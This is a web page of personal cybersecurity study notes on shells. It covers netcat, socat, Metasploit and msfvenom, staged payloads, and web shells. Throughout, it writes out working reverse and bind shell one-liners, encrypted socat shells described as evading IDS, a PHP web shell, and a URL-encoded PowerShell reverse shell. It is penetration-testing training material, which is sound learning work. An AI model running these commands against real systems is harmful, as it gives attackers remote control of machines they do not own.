<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"/><meta charSet="utf-8"/><link rel="icon" href="/favicon.ico"/><title>Shells</title><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="description" content="Personal Knowledge Space"/><meta property="og:title" content="Shells"/><meta property="og:description" content="Personal Knowledge Space"/><meta property="og:url" content="https://tysonnguyen.github.io/IBM-cybersecurity/notes/ixopv5geql8hlgkwk20pxow/"/><meta property="og:type" content="article"/><meta property="article:published_time" content="6/15/2022"/><meta property="article:modified_time" content="6/19/2022"/><link rel="canonical" href="https://tysonnguyen.github.io/IBM-cybersecurity/notes/ixopv5geql8hlgkwk20pxow/"/><meta name="next-head-count" content="14"/><link rel="preload" href="/IBM-cybersecurity/_next/static/css/0aeb6c71ee87f6df.css" as="style"/><link rel="stylesheet" href="/IBM-cybersecurity/_next/static/css/0aeb6c71ee87f6df.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/IBM-cybersecurity/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/IBM-cybersecurity/_next/static/chunks/webpack-b7a0bb0748951285.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/chunks/framework-bb5c596eafb42b22.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/chunks/main-3d5e78ffcdd2778f.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/chunks/pages/_app-b0ef1900ae658bfa.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/chunks/78-13ae6acd5ce7ca5b.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/chunks/373-2f3879190a46a3d9.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/chunks/pages/notes/%5Bid%5D-69449972c2a725d8.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/NXb5WjKoAzTxCthMfgKQk/_buildManifest.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/NXb5WjKoAzTxCthMfgKQk/_ssgManifest.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/NXb5WjKoAzTxCthMfgKQk/_middlewareManifest.js" defer=""></script></head><body><div id="__next" data-reactroot=""><section class="ant-layout" style="width:100%;min-height:100%"><header class="ant-layout-header" style="position:fixed;isolation:isolate;z-index:1;width:100%;border-bottom:1px solid #d4dadf;height:64px;padding:0 24px 0 2px"><div class="ant-row ant-row-center" style="max-width:992px;justify-content:space-between;margin:0 auto"><div style="display:flex" class="ant-col ant-col-xs-20 ant-col-sm-4"></div><div class="ant-col gutter-row ant-col-xs-0 ant-col-sm-20 ant-col-md-20 ant-col-lg-19"><div class="ant-select ant-select-lg ant-select-auto-complete ant-select-single ant-select-allow-clear ant-select-show-search" style="width:100%"><div class="ant-select-selector"><span class="ant-select-selection-search"><input type="search" autoComplete="off" class="ant-select-selection-search-input" role="combobox" aria-haspopup="listbox" aria-owns="undefined_list" aria-autocomplete="list" aria-controls="undefined_list" aria-activedescendant="undefined_list_0" value=""/></span><span class="ant-select-selection-placeholder">For full text search please use the &#x27;?&#x27; prefix. e.g. ? Onboarding</span></div></div></div><div style="display:none;align-items:center;justify-content:center" class="ant-col ant-col-xs-4 ant-col-sm-4 ant-col-md-0 ant-col-lg-0"><span role="img" aria-label="menu" style="font-size:24px" tabindex="-1" class="anticon anticon-menu"><svg viewBox="64 64 896 896" focusable="false" data-icon="menu" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M904 160H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0 624H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0-312H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8z"></path></svg></span></div></div></header><section class="ant-layout site-layout" style="margin-top:64px"><section class="ant-layout site-layout"><div class="site-layout-sidebar" style="flex:0 0 auto;width:calc(max((100% - 992px) / 2, 0px) + 200px);min-width:200px;padding-left:calc((100% - 992px) / 2)"><aside class="ant-layout-sider ant-layout-sider-dark" style="position:fixed;overflow:auto;height:calc(100vh - 64px);background-color:transparent;flex:0 0 200px;max-width:200px;min-width:200px;width:200px"><div class="ant-layout-sider-children"></div></aside></div><section class="ant-layout side-layout-main" style="max-width:1200px;display:initial"><main class="ant-layout-content main-content" role="main" style="padding:0 24px"><div class="ant-row"><div class="ant-col ant-col-24"><div class="ant-row" style="margin-left:-10px;margin-right:-10px"><div style="padding-left:10px;padding-right:10px" class="ant-col ant-col-xs-24 ant-col-md-18"><div><h1 id="shells"><a aria-hidden="true" class="anchor-heading icon-link" href="#shells"></a>Shells</h1>
<h1 id="what-is-a-shell"><a aria-hidden="true" class="anchor-heading icon-link" href="#what-is-a-shell"></a>What is a Shell?</h1>
<p>Shells are what we use when interfacing with a Command Line environment (CLI).</p>
<ul>
<li>bash or sh for Linux</li>
<li>cmd.exe and Powershell on Windows</li>
</ul>
<p>We can force the remote server to either send us command line access to the server (a <strong>reverse</strong> shell), or to open a port on the server to connect and execute further commands (a <strong>bind</strong> shell.)</p>
<h2 id="tools"><a aria-hidden="true" class="anchor-heading icon-link" href="#tools"></a>Tools</h2>
<p>There are a variety of tools to receive reverse shells and to send bind shells.</p>
<h3 id="netcat"><a aria-hidden="true" class="anchor-heading icon-link" href="#netcat"></a>Netcat</h3>
<p>Netcat is the traditional "Swiss Army Knife" of networking.</p>
<ul>
<li>Used to perform all kinds of network interactions including things like banner grabbing during enumeration, and used to receive reverse shells and connect to remote ports attached to bind shells on a target.</li>
</ul>
<p><a href="/IBM-cybersecurity/notes/ixopv5geql8hlgkwk20pxow#reverse-shell-example">Reverse shells require shellcode and a listener. The syntax for starting a netcat listener using Linux:</a> <code>nc -lvnp &#x3C;PORT></code></p>
<ul>
<li><code>-l</code> to tell netcat that this will be a listener</li>
<li><code>-v</code> to request a verbose output</li>
<li><code>-n</code> tells netcat not to resolve host names or use DNS</li>
<li><code>-p</code> indicates the port specification will follow</li>
</ul>
<p>Any port could be used as long there is not a service already using it. If you choose to use a port below 1024, you will need <code>sudo</code> to start the listener.</p>
<ul>
<li>A good idea to use well-known port numbers (80, 443 or 53) as this is more likely to get past outbound firewall rules on the target.</li>
</ul>
<p>For <a href="/IBM-cybersecurity/notes/ixopv5geql8hlgkwk20pxow#bind-shell-example">bind shells</a>, we assume there is already a listener waiting for us on a chosen port of the target. All we have to do is connect with the syntax: <code>nc &#x3C;TARGET-IP> &#x3C;CHOSEN-PORT></code>.</p>
<ul>
<li>We use netcat to make an outbound connection to the target on our chosen port.</li>
</ul>
<h4 id="netcat-shell-stabilization"><a aria-hidden="true" class="anchor-heading icon-link" href="#netcat-shell-stabilization"></a>Netcat Shell Stabilization</h4>
<p>These shells are very unstable by default. Pressing CTRL+C kills the whole session and are non-interactive. There are ways to stabilize netcat shells on Linux systems. Meanwhile, Windows reverse shells tend to be significantly difficult.</p>
<h5 id="python"><a aria-hidden="true" class="anchor-heading icon-link" href="#python"></a>Python</h5>
<p>Almost every Linux distribution will have Python installed by default.</p>
<ol>
<li><code>python -c 'import pty;pty.spawn("/bin/bash")'</code> uses Python to spawn a better featured bash shell. Note that some targets may need the version of Python specified such as <code>python2</code> or <code>python3</code> as required.</li>
<li><code>export TERM=xterm</code> will give us access to term commands such as <code>clear</code>.</li>
<li>Finally background the shell using CTRL+Z. Back in our own terminal, we can use <code>stty raw -echo; fg</code> to allow us to turn off our own terminal echo (gives access to tab completions, the arrow keys, and CTRL+C to kill processes). It then foregrounds the shell and completing the process.</li>
</ol>
<p><img src="https://i.imgur.com/bQnFz1T.png" alt="python"></p>
<p>If the shell dies, any input in your own terminal will not be visible (result of having disabled terminal echo). Type <code>reset</code> and enter to fix this.</p>
<h5 id="rlwrap"><a aria-hidden="true" class="anchor-heading icon-link" href="#rlwrap"></a>rlwrap</h5>
<p>rlwrap is a program gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell. However, some manual stabilization must still be utilized to use CTRL+C inside the shell. rlwrap is not installed by default on Kali and can be installed with: <code>sudo apt install rlwrap</code>.</p>
<p>To use rlwrap listener: <code>rlwrap nc -lvnp &#x3C;PORT></code></p>
<ul>
<li>'rlwrap' provides a much more fully featured shell. This technique is useful with Windows shells which are difficult to stabilize.
<ul>
<li>With Linux target, it is possible to completely stabilize with the same trick before: background the shell with CTRL+Z, then use <code>stty raw -echo; fg</code> to stabilize and re-enter the shell.</li>
</ul>
</li>
</ul>
<h5 id="socat-stable"><a aria-hidden="true" class="anchor-heading icon-link" href="#socat-stable"></a>Socat Stable</h5>
<p>The third easy way to stabilize a shell is initialize a netcat shell as a stepping stone to a full featured socat shell. This technique is limited to Linux targets, as Socat shells on Windows will be no more stable than a netcat shell.</p>
<ol>
<li>First transfer a socat static compiled binary (a version of the program compiled to have no dependencies) to the target machine. A common way to achieve this would be use web server on the attacking machine inside the directory containing socat binary (<code>sudo python3 -m http.server 80</code>).</li>
<li>On the target machine, use the netcat shell to download the file with <code>wget &#x3C;LOCAL-IP>/socat -O /tmp/socat</code> for Linux. On Windows machine CLI environment with Powershell: <code>Invoke-WebRequest -uri &#x3C;LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe</code>.</li>
</ol>
<h5 id="change-terminal-tty-size"><a aria-hidden="true" class="anchor-heading icon-link" href="#change-terminal-tty-size"></a>Change Terminal tty Size</h5>
<p>Must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.</p>
<ol>
<li>Open another terminal and run <code>stty -a</code>. This will give a large stream of output.</li>
<li>In the reverse/bind shell, type <code>stty rows &#x3C;number></code> and <code>stty cols &#x3C;number></code>.</li>
<li>Input the numbers returned from running the command in own terminal. This will change the width and height of the terminal to allow programs such as text editors do display information to be accurate and correctly open.</li>
</ol>
<h3 id="socat"><a aria-hidden="true" class="anchor-heading icon-link" href="#socat"></a>Socat</h3>
<p>Like netcat on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box. However, the two big catches are:</p>
<ol>
<li>The syntax is more difficult</li>
<li>Netcat is installed on virtually every Linux distribution by default. Socat is rarely installed by default.</li>
</ol>
<p>Both Socat and Netcat have .exe versions for use on Windows.</p>
<h4 id="socat-reverse-shells"><a aria-hidden="true" class="anchor-heading icon-link" href="#socat-reverse-shells"></a>Socat Reverse Shells</h4>
<p>Socat is a connector between two points similar to the portal gun from the Portal games.</p>
<p>The syntax for a basic reverse shell listener in socat: <code>socat TCP-L:&#x3C;PORT> -</code>. This will work on either Linux or Windows and is equivalent to <code>nc -lvnp &#x3C;PORT></code>.</p>
<p>On Windows use to connect back: <code>socat TCP:&#x3C;LOCAL-IP>:&#x3C;LOCAL-PORT> EXEC:powershell.exe,pipes</code>. The pipes option is used to force powershell or cmd.exe to use Unix style standard input and output.</p>
<p>The equivalent for Linux target: <code>socat TCP:&#x3C;LOCAL-IP>:&#x3C;LOCAL-PORT> EXEC:"bash -li"</code>.</p>
<h4 id="socat-bind-shells"><a aria-hidden="true" class="anchor-heading icon-link" href="#socat-bind-shells"></a>Socat Bind Shells</h4>
<p>On a Linux target: <code>socat TCP-L:&#x3C;PORT> EXEC:"bash -li"</code>.</p>
<p>On a Windows target: <code>socat TCP-L:&#x3C;PORT> EXEC:powershell.exe,pipes</code>.</p>
<p>Regardless of the target, we use <code>socat TCP:&#x3C;TARGET-IP>:&#x3C;TARGET-PORT> -</code> on the attacking machine to connect to the waiting listener.</p>
<ul>
<li>For a fully stable Linux tty reverse shell: <code>socat TCP-L:&#x3C;PORT> FILE:'tty',raw,echo=0</code></li>
<li>To connect to the listener: <code>socat TCP:&#x3C;attacker-ip>:&#x3C;attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane</code>.
<ul>
<li><code>EXEC:"bash -li"</code> creates an interactive bash session with the arguments: pty, stderr, sigint, setsid, and sane.
<ul>
<li><code>pty</code> allocates a pseudo-terminal on the target - part of the stabilization process.</li>
<li><code>stderr</code> makes sure that any error messages get shown in the shell (often a problem in non-interactive shells).</li>
<li><code>sigint</code> passes any CTRL+C commands through into the sub-process, allowing us to kill commands inside the shell.</li>
<li><code>setsid</code> creates the process in a new session.</li>
<li><code>sane</code> stabilizes the terminal, attempting to 'normalize' it.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="socat-encrypted-shells"><a aria-hidden="true" class="anchor-heading icon-link" href="#socat-encrypted-shells"></a>Socat Encrypted Shells</h4>
<p>Socat is capable of creating encrypted shells - both bind and reverse. Encrypted shells cannot be spied on unless you have the decryption key and are often able to bypass an IDS as a result.</p>
<ol>
<li>Generate a certificate in order to use encrypted shells on our attacking machine: <code>openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</code>. This command creates a 2048 bit RSA key with a matching cert file, self-signed, and valid for just under a year. It will ask to fill information about the certificate and can be let blank, or filled randomly.</li>
<li>Now need to merge the two files into a single <code>.pem</code> file: <code>cat shell.key shell.crt > shell.pem</code>.</li>
<li>Set up our reverse shell listener with <code>socat OPENSSL-LISTEN:&#x3C;PORT>,cert=shell.pem,verify=0</code>. This opens up an OPENSSL listener using the generated certificate and <code>verify=0</code> tells the connection to not bother trying to validate our certificate has been properly signed by a recognized authority.
<ul>
<li>The certificate must be used on whichever device is listening.</li>
</ul>
</li>
<li>Connect back with <code>socat OPENSSL:&#x3C;LOCAL-IP>:&#x3C;LOCAL-PORT>,verify=0 EXEC:/bin/bash</code>.</li>
</ol>
<p>The same technique would apply for a bind shell.</p>
<ul>
<li>Target: <code>socat OPENSSL-LISTEN:&#x3C;PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes</code></li>
<li>Attacker: <code>socat OPENSSL:&#x3C;TARGET-IP>:&#x3C;TARGET-PORT>,verify=0</code></li>
</ul>
<h3 id="metasploit----multihandler"><a aria-hidden="true" class="anchor-heading icon-link" href="#metasploit----multihandler"></a>Metasploit -- multi/handler</h3>
<p>The <code>auxiliary/multi/handler</code> module of the Metasploit framework is, like socat and netcat, used to receive reverse shells.</p>
<ul>
<li>The only way to interact with a meterpreter shell and easiest way to handle staged payloads.</li>
</ul>
<h3 id="msfvenom"><a aria-hidden="true" class="anchor-heading icon-link" href="#msfvenom"></a>Msfvenom</h3>
<p>Like multi/handler, msfvenom is technically part of the Metasploit Framework.</p>
<ul>
<li>Shipped as a standalone tool</li>
<li>Used to generate payloads on the fly</li>
<li>Msfvenom can generate payloads other than reverse and bind shells</li>
</ul>
<h2 id="types-of-shell"><a aria-hidden="true" class="anchor-heading icon-link" href="#types-of-shell"></a>Types of Shell</h2>
<h3 id="reverse-shells"><a aria-hidden="true" class="anchor-heading icon-link" href="#reverse-shells"></a>Reverse Shells</h3>
<p>When the target is forced to execute code that connects back to your computer (need a listener back to attacker computer).</p>
<ul>
<li>Reverse shells are good way to bypass firewall rules that may prevent from connecting to arbitrary ports on the target.
<ul>
<li>Drawback is to configure own network to accept the shell over the internet.</li>
</ul>
</li>
</ul>
<h4 id="reverse-shell-example"><a aria-hidden="true" class="anchor-heading icon-link" href="#reverse-shell-example"></a>Reverse Shell Example</h4>
<p>A reverse shell listener to receive the connection. A simulation of sending a reverse shell.</p>
<p><img src="https://i.imgur.com/rN7YkJJ.png" alt="reverse shell"></p>
<p>On the attacking machine: <code>sudo nc -lvnp 443</code></p>
<p>On the the target: <code>nc &#x3C;LOCAL-IP> &#x3C;PORT> -e /bin/bash</code></p>
<h3 id="bind-shells"><a aria-hidden="true" class="anchor-heading icon-link" href="#bind-shells"></a>Bind Shells</h3>
<p>When the code executed on the target is used to start a listener attached to a shell directly on the target.</p>
<ul>
<li>Open to the internet allowing to connect to the port that the code has opened and obtain remote code execution.
<ul>
<li>Advantage of not requiring any configuration on own network, but may be prevented by firewalls protecting the target.</li>
</ul>
</li>
</ul>
<h4 id="bind-shell-example"><a aria-hidden="true" class="anchor-heading icon-link" href="#bind-shell-example"></a>Bind Shell Example</h4>
<p>Listener on the target and telling it to execute <code>cmd.exe</code>.</p>
<p>On the target: <code>nc -lvnp &#x3C;PORT> -e "cmd.exe"</code></p>
<p>On the attacking machine: <code>nc MACHINE_IP &#x3C;PORT></code></p>
<p><img src="https://i.imgur.com/6GUwZsw.png" alt="bind shell"></p>
<h3 id="interactive"><a aria-hidden="true" class="anchor-heading icon-link" href="#interactive"></a>Interactive</h3>
<p>If used Powershell, Bash, Zsh, sh or any other standard CLI environment to allow interaction with programs after executing them.</p>
<h3 id="non-interactive"><a aria-hidden="true" class="anchor-heading icon-link" href="#non-interactive"></a>Non-Interactive</h3>
<p>Limited to using programs which do not require user interaction in order to run properly. The majority of simple reverse and bind shells are non-interactive.</p>
<h2 id="common-shell-payloads"><a aria-hidden="true" class="anchor-heading icon-link" href="#common-shell-payloads"></a>Common Shell Payloads</h2>
<p>On Linux, we use this code to create a listener for a bind shell: <code>mkfifo /tmp/f; nc -lvnp &#x3C;PORT> &#x3C; /tmp/f | /bin/sh >/tmp/f 2>&#x26;1; rm /tmp/f</code>.</p>
<ul>
<li>The command first creates a named pipe at <code>/tmp/f</code>. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe.</li>
<li>A very similar command can be used to send a netcat reverse shell: <code>mkfifo /tmp/f; nc -lvnp &#x3C;PORT> &#x3C; /tmp/f | /bin/sh >/tmp/f 2>&#x26;1; rm /tmp/f</code></li>
<li>For other common reverse shell payloads, <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">PayloadsAllTheThings</a> is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in many different languages.</li>
</ul>
<h2 id="msfvenom-1"><a aria-hidden="true" class="anchor-heading icon-link" href="#msfvenom-1"></a>msfvenom</h2>
<p>Msfvenom: The one-stop-shop for all things payload related. Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells.</p>
<p>The standard syntax for msfvenom: <code>msfvenom -p &#x3C;PAYLOAD> &#x3C;OPTIONS></code>.</p>
<ul>
<li>To generate a Windows x64 Reverse Shell in an exe format: <code>msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&#x3C;listen-IP> LPORT=&#x3C;listen-port></code>.
<ul>
<li><code>-f</code> specifies the output format.</li>
<li><code>-o</code> the output location and filename for the generated payload.</li>
<li><code>LHOST=&#x3C;IP></code> specifies the IP to connect back to.</li>
<li><code>LPORT=&#x3C;PORT></code> the port on the local machine to connect back to. This can be anything between 0-65535 that isn't already in use. However, the ports below 1024 are restricted and require a listener running with root privileges.</li>
</ul>
</li>
</ul>
<h3 id="staged-payloads"><a aria-hidden="true" class="anchor-heading icon-link" href="#staged-payloads"></a>Staged Payloads</h3>
<p>Staged payloads are sent in two parts.</p>
<ol>
<li>Stager - A piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead, it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions.</li>
</ol>
<ul>
<li>The payloads are split into two parts - a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener - usually the Metasploit multi/handler.</li>
</ul>
<h3 id="stageless-payloads"><a aria-hidden="true" class="anchor-heading icon-link" href="#stageless-payloads"></a>Stageless Payloads</h3>
<p>Stageless payloads are more common where they are entirely self-contained. There is one piece of code which, when executed, sends a shell back immediately to the waiting listener.</p>
<h3 id="meterpreter"><a aria-hidden="true" class="anchor-heading icon-link" href="#meterpreter"></a>Meterpreter</h3>
<p><a href="/IBM-cybersecurity/notes/5jlm4r7fxj9qpp2xtelvktu">Meterpreter shells are Metasploit's own brand of fully-featured shell</a>. They are completely stable, making them very good when working with Windows targets.</p>
<ul>
<li>Built-in functionality such as file uploads and downloads.</li>
<li>Downside is meterpreter shells must be caught in Metasploit.</li>
<li>Also banned from certain certification examinations.</li>
</ul>
<h3 id="payload-naming-conventions"><a aria-hidden="true" class="anchor-heading icon-link" href="#payload-naming-conventions"></a>Payload Naming Conventions</h3>
<p>When working with msfvenom, the basic convention is <code>&#x3C;OS>/&#x3C;arch>/&#x3C;payload></code>.</p>
<ul>
<li>Example: <code>linux/x86/shell_reverse_tcp</code>
<ul>
<li>This would generate a stageless reverse shell for an x86 Linux target.</li>
</ul>
</li>
</ul>
<p>The exception to this convention is Windows 32 bit targets. The arch is not specified: <code>windows/shell_reverse_tcp</code></p>
<ul>
<li>For a 64 bit Windows target, the arch would be specified as normal (x64).</li>
</ul>
<p>Stageless payloads are denoted with underscores (<code>_</code>). The staged equivalent would be <code>shell/reverse_tcp</code></p>
<ul>
<li>Staged payloads are denoted with another forward slash (<code>/</code>).
<ul>
<li>A Windows 64 bit staged Meterpreter payload: <code>windows/x64/meterpreter/reverse_tcp</code></li>
<li>A Linux 32 bit stageless Meterpreter payload: <code>linux/x86/meterpreter_reverse_tcp</code></li>
</ul>
</li>
</ul>
<p><code>msfvenom --list payloads</code> can be used to list all available payloads, which can then be piped into <code>grep</code> to search for a specific set of payloads.</p>
<p><img src="https://i.imgur.com/iFO6ydX.png" alt="payloads"></p>
<h3 id="metasploit-multihandler"><a aria-hidden="true" class="anchor-heading icon-link" href="#metasploit-multihandler"></a><a href="/IBM-cybersecurity/notes/9k9gs0zqcs40mq2fsi5nesj">Metasploit</a> multi/handler</h3>
<p>Multi/Handler is a superb tool for catching reverse shell. It is essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.</p>
<ol>
<li>Open Metasploit with <code>msfconsole</code>.</li>
<li>Type <code>use multi/handler/</code>, and press Enter.</li>
</ol>
<p>Using the <code>options</code> command, we need to set: payload, LHOST and LPORT.</p>
<ul>
<li>Set these options with the following commands: 
<ul>
<li><code>set PAYLOAD &#x3C;payload></code></li>
<li><code>set LHOST &#x3C;listen-address></code></li>
<li><code>set LPORT &#x3C;listen-port></code></li>
</ul>
</li>
</ul>
<p>We can now start a listener with <code>exploit -j</code> to tell Metasploit to launch the module, running the job in the background.</p>
<ul>
<li>When multi/handler is in the background, use <code>sessions</code> to see all active sessions, and then use <code>sessions &#x3C;number></code> to select the appropriate session to foreground.</li>
</ul>
<h2 id="web-shells"><a aria-hidden="true" class="anchor-heading icon-link" href="#web-shells"></a>Web Shells</h2>
<p>There are times where websites allow us an opportunity to upload an executable file. A 'webshell' is a term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server.</p>
<ul>
<li>Commands are entered into a webpage - either through an HTML form, or directly in the URL - which are then executed by the script.</li>
<li>Extremely useful if there are firewalls in place, or even a stepping stone into a fully fledged reverse or bind shell.</li>
</ul>
<p>PHP is still the most common server side scripting language.</p>
<p><code>&#x3C;?php echo "&#x3C;pre>" . shell_exec($_GET["cmd"]) . "&#x3C;/pre>"; ?></code></p>
<p>This will take a GET parameter in the URL and execute it on the system with <code>shell_exec()</code>. Any commands we enter in the URL after <code>?cmd=</code> will be executed  on the system - Windows or Linux. The pre elements are to ensure that the results are formatted correctly on the page.</p>
<p>There are a variety of web shells available on Kali by default at <code>/usr/share/webshells</code> - including the the infamous <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">PentestMonkey php-reverse-shell</a> - a full reverse shell written in PHP.</p>
<ul>
<li>Most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux web servers. They will not work on Windows by default.</li>
<li>When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server.</li>
<li>RCE with URL Encoded Powershell Reverse Shell copied into the URL: 
<ul>
<li><code>powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27&#x3C;IP>%27%2C&#x3C;PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22</code>
<ul>
<li>Remember that the IP and Port (bold, towards end of the top line) will still need to be changed in the above code.</li>
</ul>
</li>
</ul>
</li>
</ul></div></div><div style="padding-left:10px;padding-right:10px" class="ant-col ant-col-xs-0 ant-col-md-6"><div><div class=""><div class="ant-anchor-wrapper dendron-toc" style="max-height:calc(100vh - 64px);z-index:1"><div class="ant-anchor"><div class="ant-anchor-ink"><span class="ant-anchor-ink-ball"></span></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#what-is-a-shell" title="What is a Shell?">What is a Shell?</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#tools" title="Tools">Tools</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#netcat" title="Netcat">Netcat</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#netcat-shell-stabilization" title="Netcat Shell Stabilization">Netcat Shell Stabilization</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#python" title="Python">Python</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#rlwrap" title="rlwrap">rlwrap</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#socat-stable" title="Socat Stable">Socat Stable</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#change-terminal-tty-size" title="Change Terminal tty Size">Change Terminal tty Size</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#socat" title="Socat">Socat</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#socat-reverse-shells" title="Socat Reverse Shells">Socat Reverse Shells</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#socat-bind-shells" title="Socat Bind Shells">Socat Bind Shells</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#socat-encrypted-shells" title="Socat Encrypted Shells">Socat Encrypted Shells</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#metasploit----multihandler" title="Metasploit -- multi/handler">Metasploit -- multi/handler</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#msfvenom" title="Msfvenom">Msfvenom</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#types-of-shell" title="Types of Shell">Types of Shell</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#reverse-shells" title="Reverse Shells">Reverse Shells</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#reverse-shell-example" title="Reverse Shell Example">Reverse Shell Example</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#bind-shells" title="Bind Shells">Bind Shells</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#bind-shell-example" title="Bind Shell Example">Bind Shell Example</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#interactive" title="Interactive">Interactive</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#non-interactive" title="Non-Interactive">Non-Interactive</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#common-shell-payloads" title="Common Shell Payloads">Common Shell Payloads</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#msfvenom-1" title="msfvenom">msfvenom</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#staged-payloads" title="Staged Payloads">Staged Payloads</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#stageless-payloads" title="Stageless Payloads">Stageless Payloads</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#meterpreter" title="Meterpreter">Meterpreter</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#payload-naming-conventions" title="Payload Naming Conventions">Payload Naming Conventions</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#metasploit-multihandler" title="Metasploit multi/handler">Metasploit multi/handler</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#web-shells" title="Web Shells">Web Shells</a></div></div></div></div></div></div></div></div></div></main><div class="ant-divider ant-divider-horizontal" role="separator"></div><footer class="ant-layout-footer" style="padding:0 24px 24px"></footer></section></section></section></section></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"note":{"id":"ixopv5geql8hlgkwk20pxow","title":"Shells","desc":"","updated":1655599508458,"created":1655331743105,"custom":{},"fname":"shells","type":"note","vault":{"fsPath":"vault"},"contentHash":"d18d50a1ac50a24fa8b5ea4a3bb03721","links":[{"type":"wiki","from":{"fname":"shells","id":"ixopv5geql8hlgkwk20pxow","vaultName":"vault"},"value":"shells","alias":"Reverse shells require shellcode and a listener. The syntax for starting a netcat listener using Linux:","position":{"start":{"line":21,"column":1,"offset":735},"end":{"line":21,"column":131,"offset":865},"indent":[]},"xvault":false,"sameFile":true,"to":{"fname":"shells","anchorHeader":"reverse-shell-example"}},{"type":"wiki","from":{"fname":"shells","id":"ixopv5geql8hlgkwk20pxow","vaultName":"vault"},"value":"shells","alias":"bind 